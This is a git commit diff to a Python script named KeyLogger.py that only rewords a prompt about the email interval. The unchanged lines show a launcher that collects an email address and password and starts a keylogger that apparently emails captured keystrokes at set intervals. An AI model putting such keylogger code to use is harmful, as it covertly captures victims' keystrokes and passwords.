2768a1f7c14dacc31a131ba69554fd921306eb8d
Shubham Patel <32131646+shubham-patel@users.noreply.github.com>
2020-09-09 21:17:00 +0530

    Update KeyLogger.py

--- KeyLogger.py
+++ KeyLogger.py
@@ -3,7 +3,7 @@
 import keylogger
 import getpass
 
-time = int(input("Enter Time interval for getting emails:"))
+time = int(input("Enter Time interval(in sec) for getting emails:"))
 email = raw_input("Email:")
 password = getpass.getpass(prompt='Password:', stream=None)
 start_keylogger = keylogger.Keylogger(time, email, password)  # time interval in seconds
